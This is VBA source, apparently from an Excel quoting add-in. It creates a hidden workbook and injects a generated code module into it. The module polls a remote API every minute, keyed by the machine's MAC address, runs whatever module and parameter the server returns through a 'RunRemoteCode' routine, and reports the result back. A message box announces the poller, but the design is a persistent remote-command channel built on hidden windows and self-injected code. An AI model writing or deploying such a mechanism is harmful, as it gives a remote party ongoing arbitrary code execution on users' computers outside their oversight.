Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    ' Gizli TeklifPollHost workbook + OnTime ile komut kuyrugu (Excel ic thread)
    EnsurePollHost
    MsgBox "Komut kuyrugu poller aktif (her ~60 sn).", vbInformation, "InstallCommandQueue"
    Set DynamicFunc = Nothing
End Function

Private Sub EnsurePollHost()
    Dim wb As Workbook
    Dim found As Boolean
    found = False

    For Each wb In Application.Workbooks
        If wb.Name = "TeklifPollHost" Then
            found = True
            Exit For
        End If
    Next wb

    If Not found Then
        Set wb = Workbooks.Add
        wb.Name = "TeklifPollHost"
        On Error Resume Next
        wb.Windows(1).Visible = False
        On Error GoTo 0
        InjectPollModule wb
    Else
        On Error Resume Next
        Application.Run "'TeklifPollHost'!CmdPoll.CommandQueueTick"
        On Error GoTo 0
    End If
End Sub

Private Sub InjectPollModule(wb As Workbook)
    Dim vbComp As Object
    Set vbComp = wb.VBProject.VBComponents.Add(1)
    vbComp.Name = "CmdPoll"
    vbComp.CodeModule.AddFromString GetPollModuleCode()
    Application.OnTime Now + TimeValue("00:00:05"), "'TeklifPollHost'!CmdPoll.CommandQueueTick"
End Sub

Private Function GetPollModuleCode() As String
    Dim s As String
    s = ""
    s = s & PollCodeMain()
    s = s & PollCodeHelpers()
    GetPollModuleCode = s
End Function

Private Function PollCodeMain() As String
    Dim s As String
    s = "Option Explicit" & vbCrLf & vbCrLf
    s = s & "Public Sub CommandQueueTick()" & vbCrLf
    s = s & "    On Error GoTo TickErr" & vbCrLf
    s = s & "    Dim baseUrl As String" & vbCrLf
    s = s & "    baseUrl = GetSetting(""ilhan"", ""Settings"", ""apiBaseUrl"", ""https://nextjs-teklif-sunucu.vercel.app/api/"")" & vbCrLf
    s = s & "    If Right(baseUrl, 1) <> ""/"" Then baseUrl = baseUrl & ""/""" & vbCrLf
    s = s & "    Dim mac As String : mac = GetMac()" & vbCrLf
    s = s & "    If mac = """" Then GoTo Reschedule" & vbCrLf
    s = s & "    Dim macEnc As String : macEnc = EncodeMac(mac)" & vbCrLf
    s = s & "    Dim http As Object : Set http = CreateObject(""MSXML2.ServerXMLHTTP.6.0"")" & vbCrLf
    s = s & "    http.Open ""GET"", baseUrl & ""commands/pending/"" & macEnc & ""/"", False" & vbCrLf
    s = s & "    http.setTimeouts 5000, 5000, 15000, 15000" & vbCrLf
    s = s & "    http.send" & vbCrLf
    s = s & "    If http.Status = 200 Then" & vbCrLf
    s = s & "        Dim resp As String : resp = http.responseText" & vbCrLf
    s = s & "        If InStr(resp, ""data"":null"") = 0 And InStr(resp, ""moduleName"") > 0 Then" & vbCrLf
    s = s & "            Dim cmdId As String : cmdId = JsonVal(resp, ""id"")" & vbCrLf
    s = s & "            Dim modName As String : modName = JsonStr(resp, ""moduleName"")" & vbCrLf
    s = s & "            Dim cmdParam As String : cmdParam = JsonStr(resp, ""param"")" & vbCrLf
    s = s & "            If Len(cmdId) > 0 And Len(modName) > 0 Then" & vbCrLf
    s = s & "                Err.Clear" & vbCrLf
    s = s & "                If Len(cmdParam) > 0 Then" & vbCrLf
    s = s & "                    Application.Run ""zInternet.RunRemoteCode"", modName, cmdParam" & vbCrLf
    s = s & "                Else" & vbCrLf
    s = s & "                    Application.Run ""zInternet.RunRemoteCode"", modName" & vbCrLf
    s = s & "                End If" & vbCrLf
    s = s & "                If Err.Number <> 0 Then" & vbCrLf
    s = s & "                    PatchDone baseUrl, cmdId, ""error"", """", Err.Description" & vbCrLf
    s = s & "                Else" & vbCrLf
    s = s & "                    PatchDone baseUrl, cmdId, ""done"", ""OK"", """"" & vbCrLf
    s = s & "                End If" & vbCrLf
    s = s & "            End If" & vbCrLf
    s = s & "        End If" & vbCrLf
    s = s & "    End If" & vbCrLf
    s = s & "    Set http = Nothing" & vbCrLf
    s = s & "    GoTo Reschedule" & vbCrLf
    s = s & "TickErr:" & vbCrLf
    s = s & "    Debug.Print ""CommandQueueTick hata: "" & Err.Description" & vbCrLf
    s = s & "Reschedule:" & vbCrLf
    s = s & "    Application.OnTime Now + TimeValue(""00:01:00""), ""'TeklifPollHost'!CmdPoll.CommandQueueTick""" & vbCrLf
    s = s & "End Sub" & vbCrLf & vbCrLf
    PollCodeMain = s
End Function

Private Function PollCodeHelpers() As String
    Dim s As String
    s = "Private Function GetMac() As String" & vbCrLf
    s = s & "    On Error Resume Next" & vbCrLf
    s = s & "    Dim wmi As Object, col As Object, o As Object" & vbCrLf
    s = s & "    Set wmi = GetObject(""winmgmts:\\.\root\cimv2"")" & vbCrLf
    s = s & "    Set col = wmi.ExecQuery(""SELECT MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True"")" & vbCrLf
    s = s & "    For Each o In col" & vbCrLf
    s = s & "        If Not IsNull(o.MACAddress) And o.MACAddress <> """" Then GetMac = o.MACAddress : Exit Function" & vbCrLf
    s = s & "    Next" & vbCrLf
    s = s & "End Function" & vbCrLf & vbCrLf
    s = s & "Private Function EncodeMac(m As String) As String" & vbCrLf
    s = s & "    EncodeMac = Replace(UCase(Trim(m)), "":"", ""%3A"")" & vbCrLf
    s = s & "End Function" & vbCrLf & vbCrLf
    s = s & "Private Function JsonVal(s As String, key As String) As String" & vbCrLf
    s = s & "    Dim sk As String : sk = """""" & key & """":""" & vbCrLf
    s = s & "    Dim p1 As Long : p1 = InStr(s, sk)" & vbCrLf
    s = s & "    If p1 = 0 Then Exit Function" & vbCrLf
    s = s & "    p1 = p1 + Len(sk)" & vbCrLf
    s = s & "    Dim p2 As Long : p2 = p1" & vbCrLf
    s = s & "    Do While p2 <= Len(s)" & vbCrLf
    s = s & "        If InStr("",}]"", Mid(s, p2, 1)) > 0 Then Exit Do" & vbCrLf
    s = s & "        p2 = p2 + 1" & vbCrLf
    s = s & "    Loop" & vbCrLf
    s = s & "    JsonVal = Trim(Mid(s, p1, p2 - p1))" & vbCrLf
    s = s & "End Function" & vbCrLf & vbCrLf
    s = s & "Private Function JsonStr(s As String, key As String) As String" & vbCrLf
    s = s & "    Dim sk As String : sk = """""" & key & """":""" & vbCrLf
    s = s & "    Dim p1 As Long : p1 = InStr(s, sk)" & vbCrLf
    s = s & "    If p1 = 0 Then Exit Function" & vbCrLf
    s = s & "    p1 = InStr(p1 + Len(sk), s, """""""") + 1" & vbCrLf
    s = s & "    Dim p2 As Long : p2 = InStr(p1, s, """""""")" & vbCrLf
    s = s & "    If p2 > p1 Then JsonStr = Mid(s, p1, p2 - p1)" & vbCrLf
    s = s & "End Function" & vbCrLf & vbCrLf
    s = s & "Private Sub PatchDone(baseUrl As String, cmdId As String, st As String, res As String, errMsg As String)" & vbCrLf
    s = s & "    On Error Resume Next" & vbCrLf
    s = s & "    Dim http As Object : Set http = CreateObject(""MSXML2.ServerXMLHTTP.6.0"")" & vbCrLf
    s = s & "    Dim body As String" & vbCrLf
    s = s & "    body = ""{""""status"""":"""""" & st & """""",""""result"""":"""""" & JsonEsc(res) & """""",""""errorMsg"""":"""""" & JsonEsc(errMsg) & """"""}""" & vbCrLf
    s = s & "    http.Open ""PATCH"", baseUrl & ""commands/"" & cmdId & ""/"", False" & vbCrLf
    s = s & "    http.setRequestHeader ""Content-Type"", ""application/json""" & vbCrLf
    s = s & "    http.send body" & vbCrLf
    s = s & "End Sub" & vbCrLf & vbCrLf
    s = s & "Private Function JsonEsc(s As String) As String" & vbCrLf
    s = s & "    JsonEsc = Replace(Replace(s, ""\"", ""\\""), """""""", ""\"""")" & vbCrLf
    s = s & "End Function" & vbCrLf
    PollCodeHelpers = s
End Function
